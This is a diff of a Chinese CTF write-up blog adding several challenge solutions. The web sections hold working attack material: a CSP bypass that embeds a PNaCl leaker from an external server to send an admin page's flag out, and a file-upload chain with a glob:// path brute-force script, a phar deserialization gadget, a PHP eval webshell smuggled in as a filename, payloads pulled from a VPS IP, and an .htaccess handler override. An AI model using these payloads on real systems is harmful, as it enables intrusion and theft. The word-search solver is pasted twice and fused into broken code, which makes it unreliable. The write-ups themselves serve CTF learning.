@@ -1,11 +1,96 @@
 ---
 title: "每日一题"
-date: 2026-06-01
-lastmod: "2026-06-01T19:07:32+0800"
+date: 2026-06-05
+lastmod: "2026-06-05T21:42:57+0800"
 ---
 <!-- generated-by: obsidian_git_blog_pipeline -->
 
 ## web
+### `[SCTF 2021]`Upload It 1
+
+容器上去是一个文件上传界面，还给了phpinfo()
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605214236373.png)
+
+同时给了附件，一个是index.php
+```
+error_reporting(0);
+session_start();
+
+define("UPLOAD_PATH", "/tmp/sandbox");
+if (!file_exists(UPLOAD_PATH)) {
+    @mkdir(UPLOAD_PATH);
+}
+
+function make_user_upload_dir() {
+    $md5_dir = md5($_SERVER['REMOTE_ADDR'] . session_id());
+    $upload_path = UPLOAD_PATH . "/" . $md5_dir;
+    @mkdir($upload_path);
+    $_SESSION["upload_path"] = $upload_path;
+}
+```
+
+能看到session_start自动解析session序列化内容，同时
+
+### `[D3CTF 2019]`babyxss
+```
+xss? seriously?
+Check out the CSP plz admin is using the latest Chrome released. You may want to look into chrome://components portable sodium chloride
+```
+这题没法弄啊，需要旧的chrome环境而且还有注册origin拿token，很麻烦
+
+在/fd.php的p参数里能发现可以控制html
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260602225141397.png)
+
+但是这里题目提示说有CSP
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260602225822078.png)
+
+```
+script-src 'none'   禁止 JS
+frame-src 'none'    禁止 iframe
+img-src 'none'      禁止图片外带
+connect-src 'none'  禁止 fetch / XHR / websocket 等连接
+```
+因此不能进行xss
+然后发现csp没有限制 `object-src`
+`object-src` 是专门管 `<object>` 和 `<embed>` 这类标签加载资源的 CSP 指令，MDN 也明确说它控制 `<object>` 和 `<embed>` 元素的合法来源
+
+根据hint去`chrome://components`里头找有什么可以利用的组件  
+最新版chrome已经默认禁止了flash的使用(然而就是有很多人不信邪)  
+通过一些搜索可以发现pNaCl可以跑C/C++
+
+pNaCl / NaCl 是 Chrome 以前支持的一种技术，可以在浏览器里跑编译后的 C/C++ 代码。Chrome 官方文档也说，Native Client 是用于在浏览器中运行编译后的 C/C++ 代码的沙箱技术，不过它后来已经废弃
+
+可以编写一个 Leak 去请求 `admin.php`，获取 flag，然后再将 flag 带出来
+下载下来谷歌的[SDK](https://developers.google.com/native-client/dev/sdk/download)和Leak后可以编译出一个nmf文件和一个pexe文件，放到自己的服务器上然后尝试:
+```
+<embed src="http://server_url/url_loader.nmf" type="application/x-pnacl">
+```
+
+轻松获得了一个Mixed Content呢（（毒瘤出题人  
+上https以后发现:
+```csharp
+PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled
+```
+
+搜索Origin Trial，看新闻：
+
+[https://developer.chrome.com/native-client/migration](https://developer.chrome.com/native-client/migration)  
+[https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md](https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md)
+
+去[Origin Trial](https://developers.chrome.com/origintrials)申请一个token，最终的payload:
+
+```xml
+<meta http-equiv="origin-trial" content="[token]">
+<embed src="https://server_url/url_loader.nmf" type="application/x-pnacl">
+```
+
+说是xss你还真信啊.jpg  
+其实网上有现成的[Leak](https://github.com/shhnjk/PNaCl_Leaker)  
+总结起来就是object-src missing, html controllable的情况。虽然网上其实已经有了exp，但是貌似还是有很多人没有碰到过。
+
 ### `[D3CTF 2019]`ezupload
 ```
 webroot in var/www/html  
@@ -110,6 +195,193 @@ elseif ($_POST['action'] === "count") {
     }
 }
 ```
+
+`$_SERVER["REMOTE_ADDR"]`获取访问者真实ip
+```
+$this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
+```
+
+upload()函数中有`file_get_contents`和`file_put_contents`，读取文件与写入文件，审计可以看出需要phar反序列化
+
+但如果使用相对路径，会发现无法写入
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603215433120.png)
+
+#### 路径爆破
+
+这里阴间的地方是，虽然题目告诉我们根目录是/var/www/html，但是真实路径是`/var/www/html/随机时间戳`
+使用glob://协议进行爆破
+```
+action=count&url=1&filename=1&dir=glob:///var/www/html/*/upload/*/*
+```
+先随便传两个文件
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603221336608.png)
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603221241029.png)
+
+可以看到`1*`显示有两个文件，而`2*`显示无文件，因此路径是
+```
+glob:///var/www/html/1*/upload/*/*
+```
+下为爆破脚本
+```
+import requests
+import string
+import time
+import re
+
+URL = "http://node4.anna.nssctf.cn:23557/"
+HASH = "304877947601b12463e8f64032faec51"
+
+# 只上传 1 个；如果一直不命中，改成 3
+MARKERS = 3
+
+CHARS = string.ascii_letters + string.digits
+PREFIX = ""
+
+s = requests.Session()
+
+
+def upload_marker(n):
+    for i in range(n):
+        r = s.post(URL, data={
+            "action": "upload",
+            "url": "data://text/plain;base64,MQ==",
+            "filename": f"m{i}.txt"
+        })
+        print("[upload]", f"m{i}.txt", r.text[:80])
+
+
+def hit(pattern):
+    r = s.post(URL, data={
+        "action": "count",
+        "url": "1",
+        "filename": "1",
+        "dir": pattern
+    })
+
+    text = r.text
+    return re.search(r"you have\s+[1-9]\d*\s+files", text) is not None
+
+
+upload_marker(MARKERS)
+
+test = f"glob:///var/www/html/*/upload/{HASH}/*"
+print("[test]", test)
+
+if not hit(test):
+    print("[-] broad pattern not hit")
+    print("    如果你只上传了 1 个文件，这是正常的。")
+    print("    把 MARKERS = 3 再跑。")
+    exit()
+
+print("[+] broad hit, start brute")
+
+while True:
+    found = False
+
+    for c in CHARS:
+        p = PREFIX + c
+        pattern = f"glob:///var/www/html/{p}*/upload/{HASH}/*"
+
+        if hit(pattern):
+            PREFIX = p
+            print("[+]", PREFIX)
+            found = True
+            break
+
+        time.sleep(0.03)
+
+    if not found:
+        print("[!] no next char")
+        print("[+] maybe random dir =", PREFIX)
+        print("[+] abs path =")
+        print(f"/var/www/html/{PREFIX}/upload/{HASH}")
+        print("[+] web path =")
+        print(f"/{PREFIX}/upload/{HASH}/")
+        break
+```
+
+成功爆破路径如下
+```
+[+] absolute upload dir:
+    /var/www/html/15d4e891d784977c/upload/304877947601b12463e8f64032faec51
+```
+
+#### 构造反序列化
+
+获得路径后找利用点构造反序列化
+```
+phar metadata 反序列化
+-> 请求结束触发 outer::__destruct()
+-> 拼接字符串时触发 inner::__toString()
+-> inner::__toString() 去 scandir(upload/<hash>)
+-> 目录列表字符串（上传文件夹下所有的文件名）被 outer::__destruct() 写进 outer->filename . ".txt"
+```
+
+注意这里stub不能有php，会被过滤
+```
+<?php
+class dir{
+    public $userdir;
+    public $url;
+    public $filename;
+    public function __construct($usedir,$url,$filename){
+        $this->userdir = $usedir;
+        $this->url = $url;
+        $this->filename = $filename;
+    }
+}
+$a = new dir('upload/{your_upload_path}','','');
+$o = new dir($a,'','/var/www/html/xxx/upload/{your_upload_path}/2');
+
+$phar = new Phar("test.phar");
+$phar->startBuffering();
+$phar->setStub("__HALT_COMPILER(); ?>");
+$phar->setMetadata($o);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+echo urlencode(serialize($o));
+?>
+```
+
+光“写一个 txt”还不够，关键是 txt 里面的内容怎么变成 PHP 代码
+
+这题最妙的地方在这：
+```
+上传内容会被过滤 <?php，所以文件内容里放不了 shell
+但它根本不检查文件名里有没有 <?php
+所以可以上传一个文件，文件名直接叫：
+<?php echo 1.1;eval($_GET["a"]);
+里面塞一个.绕过ph的过滤
+
+action=upload&url=http://xxx&filename=<?php echo 1.1;eval($_GET["a"]);?>
+这里需要把php语法闭合，不然后面的其他内容会导致报错
+```
+
+vps上传序列化内容
+```
+action=upload&url=http://vps:port/phar.jpg&filename=1.jpg
+action=upload&url=http://119.28.213.74:8000/phar.jpg&filename=1.jpg
+```
+然后通过file_get_contents触发
+```
+action=upload&url=phar://upload/{your_upload_path}/1.jpg&filename=2.jpg
+action=upload&url=phar://upload/304877947601b12463e8f64032faec51/1.jpg&filename=2.jpg
+```
+
+然后通过上传.htaccess来把txt文件当作php解析
+```
+AddHandler php7-script .txt
+```
+
+```
+action=upload&url=http://vps:port/.htaccess.txt&filename=.htaccess
+action=upload&url=http://119.28.213.74:8000/.htaccess&filename=.htaccess
+```
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605011303368.png)
 
 ### `[GFCTF 2021]`文件查看器
 ```
@@ -1092,8 +1364,885 @@ jwt.io修改为admin用户访问/hello即可
 
 ![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601103005401.png)
 
-## misc
+### `[NSSCTF 2022 Spring Recruit]`ezgame
 
+春季招新赛的题，确实有些简单了
+
+源代码是个游戏，能看到泄露的preload.js，提示需要score超过65给flag
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605134454381.png)
+
+直接找看js源码，搜索score，发现在进行分数判断的上面有明文NSSCTF的flag
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605134252254.png)
+
+这个flag应该隐去的，然后正常流程应该是在控制台直接输入`scorePoint=10000;`然后结束游戏即可拿到flag
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605134904203.png)
+
+也不需要动调什么的
+## misc
+### `[SEETF 2023]`1337er Word Search
+
+```
+It's a bigger word search. Find the flag hidden in the grid, in any of the eight directions (horizontal, vertical, or diagonal).
+
+flag格式为SEE{}
+```
+
+看看这个词表长什么样子
+```
+<html>
+<head>
+<title>1337er Word Search</title>
+<style>
+#grid {
+  display: grid;
+  grid-template-columns: repeat(16, 1fr);
+  list-style: none;
+  width: 320px;
+  font-family: monospace;
+}
+li {
+	height: 20px;
+}
+</style>
+</head>
+<body>
+<p>It's a massive word search, but for speed reasons we can only show a 16x16 window at a time. Use the arrow keys to move around.</p>
+<ul id="grid" align="center"></ul>
+<script>
+let x = 3141592653589793n;
+let y = 2718281828459045n;
+
+const get=(x,y,n=1337)=>n?dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]:x|y?' ':'0';
+const draw=()=>{
+	let s = '';
+	for (let j = 0n; j < 16n; j++)
+		for (let i = 0n; i < 16n; i++)
+			s += `<li>${get(x+i,y+j)}</li>`
+	grid.innerHTML = s;
+};
+
+onkeydown = e => {
+	switch (e.keyCode) {
+		case 37: x--; break;
+		case 38: y--; break;
+		case 39: x++; break;
+		case 40: y++; break;
+		default: return;
+	}
+	draw();
+};
+
+dic={
+'0':'nf0u',
+'1':'hPMX',
+'2':'4Jxl',
+'3':'tcCJ',
+'4':'4nxn',
+'5':'T}Yv',
+'6':'oI1C',
+'7':'qQ7Y',
+'8':'GHJY',
+'9':'}Iqi',
+'A':'Kwuo',
+'B':'BJLI',
+'C':'zsRd',
+'D':'qCKt',
+'E':'IieS',
+'F':'tEIS',
+'G':'gvJY',
+'H':'RG{a',
+'I':'N}yE',
+'J':'UXje',
+'K':'wK}x',
+'L':'6QY9',
+'M':'RL2b',
+'N':'gypL',
+'O':'6USu',
+'P':'MUBc',
+'Q':'muOg',
+'R':'BJeS',
+'S':'tCCt',
+'T':'R2E}',
+'U':'snfE',
+'V':'3mAY',
+'W':'dQbw',
+'X':'CmIR',
+'Y':'PAKu',
+'Z':'NbnS',
+'_':'LUfN',
+'a':'_JVr',
+'b':'ZGhe',
+'c':'nrWJ',
+'d':'4gNn',
+'e':'o9AT',
+'f':'Mkuz',
+'g':'}BCV',
+'h':'SF89',
+'i':'QOF4',
+'j':'{OrK',
+'k':'1LGn',
+'l':'5c{K',
+'m':'roLg',
+'n':'z5Ql',
+'o':'CRtc',
+'p':'oQxu',
+'q':'cFkd',
+'r':'y5{g',
+'s':'J2Fa',
+'t':'Uigt',
+'u':'{R{3',
+'v':'bc_u',
+'w':'EdZS',
+'x':'2mKs',
+'y':'_F75',
+'z':'85pn',
+'{':'u1Vr',
+'}':'ywi1',
+' ':'    '
+}
+
+draw();
+</script>
+</body>
+</html>
+```
+
+直接看代码部分
+
+先定义了初始坐标
+```
+let x = 3141592653589793n;
+let y = 2718281828459045n;
+```
+末尾存在 n 说明是 JavaScript 的 `BigInt` 写法，这里坐标非常大，所以必须用 `BigInt`
+
+```
+const get=(x,y,n=1337)=>n?dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]:x|y?' ':'0';
+```
+这个函数精简了很多，ai改成正常格式看看
+```
+定义get函数
+const get = (x, y, n = 1337) => {
+    if (n) {
+        let parent = get(x >> 1n, y >> 1n, n - 1);
+        let idx = ((y & 1n) << 1n) | (x & 1n);
+        return dic[parent][idx];
+    } else {
+        if (x | y) {
+            return ' ';
+        } else {
+            return '0';
+        }
+    }
+};
+```
+其作用是返回第n层网络中坐标(x,y)处的字符
+先查看递归结束点
+```
+if (x | y) {
+    return ' ';
+} else {
+    return '0';
+}
+第 0 层网格只有一个核心字符：
+坐标 (0, 0) 是 '0'
+其他位置都是空格 ' '
+```
+
+然后查看递归部分 n>0
+1. 找父层坐标
+```
+get(x >> 1n, y >> 1n, n - 1)
+
+x >> 1n  等价于 floor(x / 2)
+y >> 1n  等价于 floor(y / 2)
+```
+
+所以当前层坐标 `(x, y)` 的父层坐标是：
+```
+(floor(x / 2), floor(y / 2))
+```
+
+例如：
+```
+当前坐标 (6, 9)父层坐标：x >> 1 = 3y >> 1 = 4所以父层是 (3, 4)
+```
+
+也就是说，当前层的每个 `2×2` 小块，都来自父层的一个字符
+
+2. 计算当前点在 2×2 块里的位置
+```
+(y & 1n) << 1n | x & 1n
+```
+这里用的是最低位。
+
+`x & 1n` 表示 x 是奇数还是偶数：
+```
+x & 1 = 0  偶数x & 1 = 1  奇数
+```
+
+`y & 1n` 也是一样
+索引计算：
+```
+idx = ((y & 1n) << 1n) | (x & 1n)
+```
+可以得到 0、1、2、3 四种情况。
+对应关系是：
+
+|x最低位|y最低位|idx|位置|
+|---|---|---|---|
+|0|0|0|左上|
+|1|0|1|右上|
+|0|1|2|左下|
+|1|1|3|右下|
+
+所以：
+```
+idx = 0 取父字符展开后的第 1 个字符
+idx = 1 取父字符展开后的第 2 个字符
+idx = 2 取父字符展开后的第 3 个字符
+idx = 3 取父字符展开后的第 4 个字符
+```
+3. 根据 dic 做字符替换
+dic里有`'0':'nf0u'`这样格式的展开，根据上面的规律进行映射
+
+#### 如何解题
+
+因此这题我们想找flag，需要
+```
+从某个范围开始扫：  
+找 S  
+找 E  
+找 E  
+找 {
+```
+
+但是表格太大不可能这样找，因此需要用`get(x,y,n=1337)`递归函数进行反推
+```
+我希望某几个点分别是 S、E、E、{
+反推它们上一层可能是什么字符
+再反推上一层的上一层
+...
+直到第 0 层
+```
+
+如果最后能回到：
+```
+(0,0) = '0'其他地方 = ' '
+```
+
+说明这个位置存在
+
+最后代码部分就交给ai了（）
+```
+import re
+import sys
+
+HTML_PATH = sys.argv[1] if len(sys.argv) > 1 else "wordsearch2.html"
+
+PREFIX = "SEE{"
+DEPTH = 1337
+MAX_FLAG_LEN = 200
+
+
+def load_dic(path):
+    with open(path, "r", encoding="utf-8") as f:
+        html = f.read()
+
+    pairs = re.findall(r"'([^']*)'\s*:\s*'([^']*)'", html)
+    dic = dict(pairs)
+
+    if not dic:
+        raise RuntimeError("没有解析到 dic")
+
+    if "0" not in dic:
+        raise RuntimeError("dic 中没有 '0'")
+
+    if " " not in dic:
+        raise RuntimeError("dic 中没有空格字符")
+
+    return dic
+
+
+dic = load_dic(HTML_PATH)
+alphabet = tuple(dic.keys())
+
+
+def get_char(x, y, n=DEPTH):
+    """
+    等价于原 JS:
+
+    get=(x,y,n=1337)=>n
+      ? dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]
+      : x|y?' ':'0';
+
+    这里改成迭代版。
+    """
+
+    indexes = []
+
+    xx = x
+    yy = y
+
+    for _ in range(n):
+        idx = ((yy & 1) << 1) | (xx & 1)
+        indexes.append(idx)
+
+        xx >>= 1
+        yy >>= 1
+
+    if xx | yy:
+        c = " "
+    else:
+        c = "0"
+
+    for idx in reversed(indexes):
+        c = dic[c][idx]
+
+    return c
+
+
+def state_key(state):
+    return tuple(sorted(
+        (a, b, "".join(sorted(chars)))
+        for (a, b), chars in state.items()
+    ))
+
+
+def initial_state(pattern, dx, dy):
+    """
+    假设 pattern 沿方向 (dx, dy) 出现。
+
+    例如 direction = (-1, 1):
+
+    S 在 (x,   y)
+    E 在 (x-1, y+1)
+    E 在 (x-2, y+2)
+    { 在 (x-3, y+3)
+    """
+
+    state = {}
+
+    for i, ch in enumerate(pattern):
+        state[(i * dx, i * dy)] = frozenset({ch})
+
+    return state
+
+
+def transition_from_key(key, rx, ry):
+    """
+    逆推一层。
+
+    已知当前层某些点的字符约束，
+    反推出父层这些点可能是什么字符。
+    """
+
+    parent_constraints = {}
+
+    for a, b, chars in key:
+        allowed_child_chars = frozenset(chars)
+
+        child_x_parity = (rx + a) & 1
+        child_y_parity = (ry + b) & 1
+
+        idx = (child_y_parity << 1) | child_x_parity
+
+        parent_a = (rx + a) // 2
+        parent_b = (ry + b) // 2
+
+        parent_constraints.setdefault((parent_a, parent_b), []).append(
+            (idx, allowed_child_chars)
+        )
+
+    parent_state = {}
+
+    for parent_pos, constraints in parent_constraints.items():
+        possible_parent_chars = []
+
+        for parent_char in alphabet:
+            ok = True
+
+            for idx, allowed_child_chars in constraints:
+                child_char = dic[parent_char][idx]
+
+                if child_char not in allowed_child_chars:
+                    ok = False
+                    break
+
+            if ok:
+                possible_parent_chars.append(parent_char)
+
+        if not possible_parent_chars:
+            return None
+
+        parent_state[parent_pos] = frozenset(possible_parent_chars)
+
+    return state_key(parent_state)
+
+
+def base_ok_key(key):
+    """
+    第 0 层规则：
+
+    (0,0) 是 '0'
+    其他坐标是空格 ' '
+    """
+
+    for a, b, chars in key:
+        expected = "0" if (a, b) == (0, 0) else " "
+
+        if expected not in chars:
+            return False
+
+    return True
+
+
+def solve_start_for_direction(pattern, dx, dy, depth=DEPTH):
+    """
+    无递归版逆推。
+
+    返回:
+        (x, y)
+
+    找不到则返回 None。
+    """
+
+    start_key = state_key(initial_state(pattern, dx, dy))
+
+    failed = set()
+
+    stack = [
+        {
+            "key": start_key,
+            "d": depth,
+            "next": 0,
+            "choice": None,
+        }
+    ]
+
+    choices = [
+        (0, 0),
+        (0, 1),
+        (1, 0),
+        (1, 1),
+    ]
+
+    while stack:
+        frame = stack[-1]
+
+        key = frame["key"]
+        d = frame["d"]
+
+        if (key, d) in failed:
+            stack.pop()
+            continue
+
+        if d == 0:
+            if base_ok_key(key):
+                x = 0
+                y = 0
+
+                path = [f["choice"] for f in stack[1:]]
+
+                for rx, ry in reversed(path):
+                    x = 2 * x + rx
+                    y = 2 * y + ry
+
+                return x, y
+
+            failed.add((key, d))
+            stack.pop()
+            continue
+
+        if frame["next"] >= len(choices):
+            failed.add((key, d))
+            stack.pop()
+            continue
+
+        rx, ry = choices[frame["next"]]
+        frame["next"] += 1
+
+        parent_key = transition_from_key(key, rx, ry)
+
+        if parent_key is None:
+            continue
+
+        if (parent_key, d - 1) in failed:
+            continue
+
+        stack.append(
+            {
+                "key": parent_key,
+                "d": d - 1,
+                "next": 0,
+                "choice": (rx, ry),
+            }
+        )
+
+    return None
+
+
+def read_until_end(x, y, dx, dy, max_len=MAX_FLAG_LEN):
+    """
+    找到 SEE{ 的起点后，沿方向正向读取完整 flag。
+    """
+
+    result = []
+
+    for i in range(max_len):
+        xx = x + i * dx
+        yy = y + i * dy
+
+        c = get_char(xx, yy)
+        result.append(c)
+
+        if c == "}" and i >= 3:
+            break
+
+    return "".join(result)
+
+
+def main():
+    directions = [
+        (1, 0),      # 右
+        (-1, 0),     # 左
+        (0, 1),      # 下
+        (0, -1),     # 上
+        (1, 1),      # 右下
+        (1, -1),     # 右上
+        (-1, 1),     # 左下
+        (-1, -1),    # 左上
+    ]
+
+    for dx, dy in directions:
+        print("[*] trying direction:", (dx, dy))
+
+        start = solve_start_for_direction(PREFIX, dx, dy)
+
+        if start is None:
+            continue
+
+        x, y = start
+        candidate = read_until_end(x, y, dx, dy)
+
+        if candidate.startswith(PREFIX):
+            print("[+] found")
+            print("direction:", (dx, dy))
+            print("start:", (x, y))
+            print("flag:", candidate)
+
+
+if __name__ == "__main__":
+    main()import re
+import sys
+
+HTML_PATH = sys.argv[1] if len(sys.argv) > 1 else "wordsearch2.html"
+
+PREFIX = "SEE{"
+DEPTH = 1337
+MAX_FLAG_LEN = 200
+
+
+def load_dic(path):
+    with open(path, "r", encoding="utf-8") as f:
+        html = f.read()
+
+    pairs = re.findall(r"'([^']*)'\s*:\s*'([^']*)'", html)
+    dic = dict(pairs)
+
+    if not dic:
+        raise RuntimeError("没有解析到 dic")
+
+    if "0" not in dic:
+        raise RuntimeError("dic 中没有 '0'")
+
+    if " " not in dic:
+        raise RuntimeError("dic 中没有空格字符")
+
+    return dic
+
+
+dic = load_dic(HTML_PATH)
+alphabet = tuple(dic.keys())
+
+
+def get_char(x, y, n=DEPTH):
+    """
+    等价于原 JS:
+
+    get=(x,y,n=1337)=>n
+      ? dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]
+      : x|y?' ':'0';
+
+    这里改成迭代版。
+    """
+
+    indexes = []
+
+    xx = x
+    yy = y
+
+    for _ in range(n):
+        idx = ((yy & 1) << 1) | (xx & 1)
+        indexes.append(idx)
+
+        xx >>= 1
+        yy >>= 1
+
+    if xx | yy:
+        c = " "
+    else:
+        c = "0"
+
+    for idx in reversed(indexes):
+        c = dic[c][idx]
+
+    return c
+
+
+def state_key(state):
+    return tuple(sorted(
+        (a, b, "".join(sorted(chars)))
+        for (a, b), chars in state.items()
+    ))
+
+
+def initial_state(pattern, dx, dy):
+    """
+    假设 pattern 沿方向 (dx, dy) 出现。
+
+    例如 direction = (-1, 1):
+
+    S 在 (x,   y)
+    E 在 (x-1, y+1)
+    E 在 (x-2, y+2)
+    { 在 (x-3, y+3)
+    """
+
+    state = {}
+
+    for i, ch in enumerate(pattern):
+        state[(i * dx, i * dy)] = frozenset({ch})
+
+    return state
+
+
+def transition_from_key(key, rx, ry):
+    """
+    逆推一层。
+
+    已知当前层某些点的字符约束，
+    反推出父层这些点可能是什么字符。
+    """
+
+    parent_constraints = {}
+
+    for a, b, chars in key:
+        allowed_child_chars = frozenset(chars)
+
+        child_x_parity = (rx + a) & 1
+        child_y_parity = (ry + b) & 1
+
+        idx = (child_y_parity << 1) | child_x_parity
+
+        parent_a = (rx + a) // 2
+        parent_b = (ry + b) // 2
+
+        parent_constraints.setdefault((parent_a, parent_b), []).append(
+            (idx, allowed_child_chars)
+        )
+
+    parent_state = {}
+
+    for parent_pos, constraints in parent_constraints.items():
+        possible_parent_chars = []
+
+        for parent_char in alphabet:
+            ok = True
+
+            for idx, allowed_child_chars in constraints:
+                child_char = dic[parent_char][idx]
+
+                if child_char not in allowed_child_chars:
+                    ok = False
+                    break
+
+            if ok:
+                possible_parent_chars.append(parent_char)
+
+        if not possible_parent_chars:
+            return None
+
+        parent_state[parent_pos] = frozenset(possible_parent_chars)
+
+    return state_key(parent_state)
+
+
+def base_ok_key(key):
+    """
+    第 0 层规则：
+
+    (0,0) 是 '0'
+    其他坐标是空格 ' '
+    """
+
+    for a, b, chars in key:
+        expected = "0" if (a, b) == (0, 0) else " "
+
+        if expected not in chars:
+            return False
+
+    return True
+
+
+def solve_start_for_direction(pattern, dx, dy, depth=DEPTH):
+    """
+    无递归版逆推。
+
+    返回:
+        (x, y)
+
+    找不到则返回 None。
+    """
+
+    start_key = state_key(initial_state(pattern, dx, dy))
+
+    failed = set()
+
+    stack = [
+        {
+            "key": start_key,
+            "d": depth,
+            "next": 0,
+            "choice": None,
+        }
+    ]
+
+    choices = [
+        (0, 0),
+        (0, 1),
+        (1, 0),
+        (1, 1),
+    ]
+
+    while stack:
+        frame = stack[-1]
+
+        key = frame["key"]
+        d = frame["d"]
+
+        if (key, d) in failed:
+            stack.pop()
+            continue
+
+        if d == 0:
+            if base_ok_key(key):
+                x = 0
+                y = 0
+
+                path = [f["choice"] for f in stack[1:]]
+
+                for rx, ry in reversed(path):
+                    x = 2 * x + rx
+                    y = 2 * y + ry
+
+                return x, y
+
+            failed.add((key, d))
+            stack.pop()
+            continue
+
+        if frame["next"] >= len(choices):
+            failed.add((key, d))
+            stack.pop()
+            continue
+
+        rx, ry = choices[frame["next"]]
+        frame["next"] += 1
+
+        parent_key = transition_from_key(key, rx, ry)
+
+        if parent_key is None:
+            continue
+
+        if (parent_key, d - 1) in failed:
+            continue
+
+        stack.append(
+            {
+                "key": parent_key,
+                "d": d - 1,
+                "next": 0,
+                "choice": (rx, ry),
+            }
+        )
+
+    return None
+
+
+def read_until_end(x, y, dx, dy, max_len=MAX_FLAG_LEN):
+    """
+    找到 SEE{ 的起点后，沿方向正向读取完整 flag。
+    """
+
+    result = []
+
+    for i in range(max_len):
+        xx = x + i * dx
+        yy = y + i * dy
+
+        c = get_char(xx, yy)
+        result.append(c)
+
+        if c == "}" and i >= 3:
+            break
+
+    return "".join(result)
+
+
+def main():
+    directions = [
+        (1, 0),      # 右
+        (-1, 0),     # 左
+        (0, 1),      # 下
+        (0, -1),     # 上
+        (1, 1),      # 右下
+        (1, -1),     # 右上
+        (-1, 1),     # 左下
+        (-1, -1),    # 左上
+    ]
+
+    for dx, dy in directions:
+        print("[*] trying direction:", (dx, dy))
+
+        start = solve_start_for_direction(PREFIX, dx, dy)
+
+        if start is None:
+            continue
+
+        x, y = start
+        candidate = read_until_end(x, y, dx, dy)
+
+        if candidate.startswith(PREFIX):
+            print("[+] found")
+            print("direction:", (dx, dy))
+            print("start:", (x, y))
+            print("flag:", candidate)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+把源码和代码放同一目录然后运行
+```
+HTML_PATH = "wordsearch2.html"
+```
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603225816303.png)
 ### `[SEETF 2022]`Sniffed Traffic
 
 ```
@@ -1204,4 +2353,34 @@ ARCAEA1F1E33
 
 ![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173341219.png)
 
-![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173150513.png)![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173150618.png)
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173150513.png)
+
+### `[NCTF 2018]`I wanna play CTF
+
+```
+这是一道肥宅快乐题，做题太累了可以玩玩，还能拿Flag
+Engine: I wanna be the engine yuuutu edition
+Background Images:
+~ Pixiv 13534647, 44526375, 47998893, 51613650, 55647411, 37940221
+BGM:
+~ 幻想機動要塞　- Falcom Sound Team jdk
+~ 行き着く先　Instrumental ver. - Falcom Sound Team jdk
+TIP: 出题组的挑战时间：
+MozhuCY：173 Death，0:37:05
+Homura: 976 Death, 1:43:21
+得到的flag使用NSSCTF{}格式提交。
+```
+
+ida查看能看到是GameMarker8编译的游戏，直接使用 GM8Decompiler 反编译出原始 GMK文件
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260604093050686.png)
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260604093132148.png)
+
+把gmk放到GM8里查看9个房间图片集齐flag
+
+![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260604093331316.png)
+
+```
+nctf{pl4y1Ng_C7f_c4n_b3coMe_5Tr0n93r}
+```
